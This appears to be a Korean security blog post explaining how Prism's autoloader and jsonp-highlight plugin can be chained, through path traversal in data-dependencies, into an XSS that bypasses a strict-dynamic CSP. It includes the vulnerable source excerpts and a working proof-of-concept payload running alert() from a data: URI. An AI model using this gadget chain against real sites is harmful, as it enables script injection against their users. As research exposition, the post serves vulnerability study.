---
layout: post
comments: false
categories: Works
---

## Prism Autoloader + JSONP Highlight

---

Prism의 autoloader는 data-dependencies 값을 바탕으로 스크립트를 동적으로 로드하며, jsonp‑highlight는 data-jsonp를 사용해 `<script src=...>`를 삽입합니다.

CSP에 strict-dynamic이 설정되어 있으면, nonce가 붙은 Prism 스크립트가 추가한 스크립트가 출처 제한 없이 실행될 수 있어 XSS 체인이 성립합니다.

- **Prism Autoloader**

```jsx
function getDependencies(element) {
  var deps = (element.getAttribute('data-dependencies') || '').trim();
  if (!deps) {
    var parent = element.parentElement;
    if (parent && parent.tagName.toLowerCase() === 'pre') {
      deps = (parent.getAttribute('data-dependencies') || '').trim();
    }
  }
  return deps ? deps.split(/\s*,\s*/g) : [];
}

function getLanguagePath(lang) {
  return config.languages_path + 'prism-' + lang + (config.use_minified ? '.min' : '') + '.js';
}
```

`getDependencies()` 가 반환한 문자열들이 그대로 `getLanguagePath(lang)` 의 lang으로 들어가게 됩니다. `data-dependencies="...”`에 있는 각 항목이 deps 배열에 들어가고, 그 항목이 lang으로 그대로 전달되어 경로 문자열에 합쳐집니다.

```
최종 src = languages_path + "prism-" + (data-dependencies 값) + ".min.js"

https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/components/
  + "prism-/../../plugins/jsonp-highlight/prism-jsonp-highlight"
  + ".min.js"
```

결국 정규화 이후에 `https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/plugins/jsonp-highlight/prism-jsonp-highlight.min.js` 가 되어 다른 스크립트가 로딩됩니다.

- **JSONP Highlight**

```jsx
function jsonp(src, callbackParameter, onSuccess, onError) {
  var callbackName = 'prismjsonp' + jsonpCallbackCounter++;

  var uri = document.createElement('a');
  uri.href = src;
  uri.href += (uri.search ? '&' : '?') + (callbackParameter || 'callback') + '=' + callbackName;

  var script = document.createElement('script');
  script.src = uri.href;
  document.head.appendChild(script);
}

```

data-jsonp 값이 그대로 <script src>로 삽입됩니다.

```jsx
<pre class="language-javascript" data-src="/" data-dependencies="/../../plugins/jsonp-highlight/prism-jsonp-highlight" data-jsonp="data:text/javascript;base64,YWxlcnQoKQ==#"></pre>
```

이런식으로 xss가 가능합니다.